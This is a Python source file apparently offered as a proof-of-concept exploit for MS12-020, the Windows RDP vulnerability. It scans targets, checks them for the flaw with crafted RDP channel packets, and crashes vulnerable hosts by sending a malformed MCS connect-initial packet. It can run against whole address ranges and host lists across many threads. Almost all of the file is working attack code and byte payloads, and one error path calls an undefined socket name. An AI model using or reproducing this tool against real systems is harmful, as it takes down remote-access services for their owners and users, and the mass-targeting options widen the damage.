# dos.py

import argparse
import sys
import os
import socket
import time
import ipaddress
import concurrent.futures

from colorama import Fore, Style

def parse_network(value: str):
    try:
        return ipaddress.ip_interface(value)
    except ValueError as ex:
        raise argparse.ArgumentTypeError(f'ValueError: {ex}')

parser = argparse.ArgumentParser(
    description='MS12-020 PoC via DoS'
)

target_group = parser.add_argument_group('Target Options', 'Target specification and connection settings')
target_group.add_argument(
    '--ip',
    type=parse_network,
    help='Target IP address or hostname'
)
target_group.add_argument(
    '--port',
    type=int,
    default=3389,
    help='Target port'
)
target_group.add_argument(
    '--file',
    help='Read target hosts from the file'
)
target_group.add_argument(
    '--timeout',
    type=float,
    default=5.0,
    help='Connection timeout in seconds'
)
target_group.add_argument(
    '--threads',
    type=int,
    default=10,
    help='Number of threads (default: 10)'
)

action_group = parser.add_argument_group('Action Options', 'Execution mode (choose one only)')
action_group_exclusive = action_group.add_mutually_exclusive_group(required=True)
action_group_exclusive.add_argument(
    '--check',
    action='store_true',
    help='Check if the target is vulnerable without crashing it'
)
action_group_exclusive.add_argument(
    '--dos',
    action='store_true',
    help='Execute the Denial of Service (DoS) attack'
)

args = parser.parse_args()

def do_readhosts(file: str) -> list:
    ip_objs = []

    with open(args.file) as f:
        hosts = f.readlines()
        for host in hosts:
            host = host.strip()

            if not host:
                continue

            if ':' not in host:
                ip_objs.append(parse_network(host))
            else:
                s = host.split(':')
                ip_objs.append(parse_network(s[0]))

    return ip_objs

'''
Check MS12-020 vulnerability on the remote machine
'''
def do_check(ip: str, port: int):
    print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} Checking {ip}:{port} for MS12-020 vulnerability...')

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        sock.connect((ip, port))

        req = b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00'
        sock.sendall(req)
        resp = sock.recv(1024)

        if not resp or not resp.startswith(b'\x03\x00\x00\x0b\x06\xd0'):
            print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Target did not return a valid RDP connection confiromation')
            sock.close()
            return False

        init = (
            b'\x03\x00\x00\x65' + 
            b'\x02\xf0\x80' +      #
            b'\x7f\x65\x5b' +      #
            b'\x04\x01\x01' +      #
            b'\x04\x01\x01' +      #
            b'\x01\x01\xff' +      #
            b'\x30\x19' +          #
            b'\x02\x01\x22' +      #
            b'\x02\x01\x20' +      #
            b'\x02\x01\x00' +      # 
            b'\x02\x01\x01' +      # 
            b'\x02\x01\x00' +      #
            b'\x02\x01\x01' +     
            b'\x02\x02\xff\xff' + 
            b'\x02\x01\x02' +     
            b'\x30\x18' +         
            b'\x02\x01\x01' +     
            b'\x02\x01\x01' +     
            b'\x02\x01\x01' +     
            b'\x02\x01\x01' +     
            b'\x02\x01\x00' +     
            b'\x02\x01\x01' +     
            b'\x02\x01\xff' +     
            b'\x02\x01\x02' +     
            b'\x30\x19' +         
            b'\x02\x01\xff' +     
            b'\x02\x01\xff' +     
            b'\x02\x01\xff' +     
            b'\x02\x01\x01' +     
            b'\x02\x01\x00' +     
            b'\x02\x01\x01' +     
            b'\x02\x02\xff\xff' + 
            b'\x02\x01\x02' +     
            b'\x04\x00'
        )

        sock.sendall(init)

        user_request = b'\x03\x00\x00\x08\x02\xf0\x80\x28'
        sock.sendall(user_request)
        res = sock.recv(1024)

        if len(res) < 11:
            print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} No valid response to first userRequest.')
            sock.close()
            return False
        
        user1 = int.from_bytes(res[9:11], byteorder='big')
        chan1 = user1 + 1001

        sock.sendall(user_request)
        res = sock.recv(1024)
        if len(res) < 11:
            print('[-] No valid response to second userRequest.')
            s.close()
            return False

        user2 = int.from_bytes(res[9:11], byteorder='big')
        chan2 = user2 + 1001

        channel_request = b'\x03\x00\x00\x0c\x02\xf0\x80\x38'
        pkt1 = channel_request + user1.to_bytes(2, byteorder='big') + chan2.to_bytes(2, byteorder='big')
        sock.sendall(pkt1)
        res = sock.recv(1024)

        if len(res) >= 9 and res[7:9] == b'\x3e\x00':
            pkt2 = channel_request + user2.to_bytes(2, byteorder='big') + chan2.to_bytes(2, byteorder='big')
            sock.sendall(pkt2)
            sock.close()
            return True
        else:
            sock.close()
            return False
        
    except Exception as ex:
        print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {ip}:{port} {ex}')

def is_rdp_up(ip: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        sock.connect((ip, port))
        sock.close()

        return True

    except Exception as ex:
        print(ex)

        return False

'''
Crash remote machine via MS12-020
'''
def do_dos(ip: str, port: int):
    print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} Target: {ip}:{port}')

    if not is_rdp_up(ip, port):
        print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {ip}:{port} - RDP unreachable')
        return

    max_channel_ids = b'\x02\x01\xff'

    base_init_pkt = (
        b'\x03\x00\x00\x13'     # TPKT: version + length
        b'\x0E\xE0\x00\x00'     # X.224 (connection request)
        b'\x00\x00\x00\x01'     
        b'\x00\x08\x00\x00'     #
        b'\x00\x00\x00' 
        b'\x03\x00\x00\x6A'     # TPKT: version + length
        b'\x02\xF0\x80'         # X.224 (connect-initial)
        b'\x7F\x65\x82\x00'     # T.125
        b'\x5E' 
        b'\x04\x01\x01'         # callingDomainSelector
        b'\x04\x01\x01'         # calledDomainSelector
        b'\x01\x01\xFF'         # upwardFlag
        b'\x30\x19'             # targetParameters
        + max_channel_ids +     # maxChannelIds
        b'\x02\x01\xFF'         # maxUserIds
        b'\x02\x01\x00'         # maxTokenIds
        b'\x02\x01\x01'         # numPriorities
        b'\x02\x01\x00'         # minThroughput
        b'\x02\x01\x01'         # maxHeight
        b'\x02\x02\x00\x7C'     # maxMCSPDUsize
        b'\x02\x01\x02'         # protocolVersion
        b'\x30\x19'             # minimumParameters
        + max_channel_ids +     # maxChannelIds
        b'\x02\x01\xFF'         # maxUserIds
        b'\x02\x01\x00'         # maxTokenIds
        b'\x02\x01\x01'         # numPriorities
        b'\x02\x01\x00'         # minThroughput
        b'\x02\x01\x01'         # maxHeight
        b'\x02\x02\x00\x7C'     # maxMCSPDUsize
        b'\x02\x01\x02'         # protocolVersion
        b'\x30\x19'             # maximumParameters
        + max_channel_ids +     # maxChannelIds
        b'\x02\x01\xFF'         # maxUserIds
        b'\x02\x01\x00'         # maxTokenIds
        b'\x02\x01\x01'         # numPriorities
        b'\x02\x01\x00'         # minThroughput
        b'\x02\x01\x01'         # maxHeight
        b'\x02\x02\x00\x7C'     # maxMCSPDUsize
        b'\x02\x01\x02'         # protocolVersion
        b'\x04\x82\x00\x00'     # userData
    )

    single_repeat_block = (
        b'\x03\x00\x00\x08'     # TPKT: version + length
        b'\x02\xF0\x80'         # X.224
        b'\x28'                 # T.125
    )
    repeated_chunks = single_repeat_block * 16

    tail_exploit_pkt = (
        b'\x03\x00\x00\x0C'
        b'\x02\xF0\x80'
        b'\x38\x00\x06\x03'
        b'\xF0'
        b'\x03\x00\x00\x09'
        b'\x02\xF0\x80'
        b'\x21\x80'
    )

    pkt = base_init_pkt + repeated_chunks + tail_exploit_pkt

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        sock.connect((ip, port))
        sock.sendall(pkt)

        time.sleep(5)

        sock.close()

        print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} {ip}:{port} - {len(pkt)} bytes sent')
    except Exception as ex:
        print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {ip}:{port} {ex}')
        return

    if is_rdp_up(ip, port):
        print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {ip}:{port} - RDP Service still up (Target might not be vulnerable or patch applied)')
    else:
        print(f'{Fore.GREEN + Style.BRIGHT}[+]{Style.RESET_ALL} {ip}:{port} seems down! Target successfully crashed via MS12-020.')

def main():
    # validate arguments
    if not ((args.ip or args.file) and args.port):
        parser.print_help()
        sys.exit(1)

    ip_objs = []            # target IP addresses
    port = int(args.port)   # target port

    if args.file:
        # # use hosts from the input file?

        if not os.path.exists(args.file):
            print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} Cannot find file: {args.file}')
            return

        ip_objs = do_readhosts(args.file)
        
        print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} Loaded file: {args.file}, hosts = {len(ip_objs)}')
    elif args.ip:
        #
        ip_objs.append(args.ip)
    else:
        parser.print_help()
        return

    all_targets = []
    for ip_obj in ip_objs:
        net_obj = getattr(ip_obj, 'network', ip_obj)
        
        if hasattr(net_obj, 'hosts'):
            all_targets.extend([str(ip) for ip in net_obj.hosts()])
        else:
            all_targets.append(str(getattr(ip_obj, 'ip', ip_obj)))

    all_targets = list(dict.fromkeys(all_targets))
    print(f'{Fore.BLUE + Style.BRIGHT}[*]{Style.RESET_ALL} Total targets to process: {len(all_targets)}')

    def worker(ip):
        if args.check:
            if do_check(ip, port):
                print(f'{Fore.GREEN + Style.BRIGHT}[+]{Style.RESET_ALL} {ip}:{port} is vulnerable')
            else:
                print(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} {ip}:{port} is not vulnerable')
        elif args.dos:
            do_dos(ip, port)
        else:
            parser.print_help()
            sys.exit(1)

    max_workers = getattr(args, 'threads', 10)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(worker, all_targets)
if __name__ == '__main__':
    main()